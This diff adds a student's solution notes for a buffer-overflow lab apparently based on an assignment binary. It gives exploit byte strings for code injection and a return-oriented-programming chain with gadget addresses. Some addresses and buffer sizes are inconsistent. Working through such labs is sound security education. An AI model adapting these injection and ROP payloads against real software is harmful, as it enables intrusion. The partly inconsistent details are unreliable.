@@ -1,0 +1,111 @@
+for phase 1:
+    - add buffer
+    - return address of touch 1
+
+
+for phase 2:
+    - set cookie:
+    movq cookie into rdi
+    retq
+    - add buffer
+    - return address of rsp
+    - return address of touch2
+
+
+for phase 3:
+    - set cookie:
+        - can't store cookie on the stack as it might get overwritten, so store as a string after touch3 instead:
+        total bytes before cookie:
+        buffer (0x38) + 8 bytes for return address of rsp + 8 bytes for return address of touch3
+        0x38 + 8 + 8 = 0x48
+
+        rsp address: 0x5567c988
+        touch3 address: 0000000000401910
+
+        rsp + 0x48 = 0x5567c988 + 0x48 = 0x5567c9d0
+        -->
+        movq $0x5567c9d0, %rdi
+        push 0x401910
+        retq
+        --> 
+        48 c7 c7 d0 c9 67 55 c3     /* byte representation of asm code above: moves rsp + 0x48 (cookie) into rdi */
+
+        rdi gets overwritten somewhere in 'random', gets stored in rbp first then in r8, to solve this issue we push the return address of touch3
+
+        cookie: 0x58400f76
+        as a string: 35 38 34 30 30 66 37 36 00
+
+    Final exploit string should look like this:
+
+    48 c7 c7 d0 c9 67 55            /* stores cookie as a string in rdi */
+    68 10 19 40 00 c3               /* pushes return address of touch3 and returns */
+    00 00 00 00 00 00 00 00         /* buffer, changed to accomodate the extra push instruction */
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00
+    88 c9 67 55 00 00 00 00         /* return address of rsp */
+    10 19 40 00 00 00 00 00         /* return address of touch3 */
+    35 38 34 30 30 66 37 36 00      /* cookie as a string, not forgetting to include the null terminator */
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+for phase 4:
+ 
+- cookie: 0x58400f76
+- first pass cookie into rdi, then go to touch2
+
+popq %rdi not given to us in gadget farm:
+alternative: popq %rax (byte representation: 58)
+Search in gadget farm:
+
+00000000004019b3 <addval_443>:
+  4019b3:	8d 87 58 90 92 c3    	lea    -0x3c6d6fa8(%rdi),%eax
+  4019b9:	c3                   	retq   
+address of 58: 4019b3 + 2 = 4019b5
+
+00000000004019ba <addval_419>:
+  4019ba:	8d 87 d7 58 92 90    	lea    -0x6f6da729(%rdi),%eax
+  4019c0:	c3                   	retq   
+address of 58: 4019ba + 3 = 4019bd
+
+00000000004019c1 <addval_158>:
+  4019c1:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
+  4019c7:	c3                   	retq   
+address of 58: 4019c1 + 2 = 4019c3
+
+00000000004019c8 <setval_193>:
+  4019c8:	c7 07 58 90 90 c3    	movl   $0xc3909058,(%rdi)
+  4019ce:	c3                   	retq   
+address of 58: 4019c8 + 2 = 4019ca
+
+
+The other instruction we need in movq %rax,%edi (byte representation: 48 89 c7)
+Search in gadget farm:
+
+00000000004019cf <setval_383>:
+  4019cf:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019d5:	c3                   	retq   
+address of instruction: 4019cf + 2 = 4019d1
+
+00000000004019d6 <setval_249>:
+  4019d6:	c7 07 48 89 c7 94    	movl   $0x94c78948,(%rdi)
+  4019dc:	c3                   	retq   
+address of instruction: 4019d6 + 2 = 4019d8
+
+
+
+00 00 00 00 00 00 00 00     /* buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00     
+
+c3 19 40 00 00 00 00 00     /* gadget 1 - choose from 4 available? */
+
+76 0f 40 58 00 00 00 00     /* cookie - shouldn't change */
+
+de 19 40 00 00 00 00 00     /* gadget 2 - choose from 3 available? */
+
+ff 17 40 00 00 00 00 00     /* touch2 - won't change */
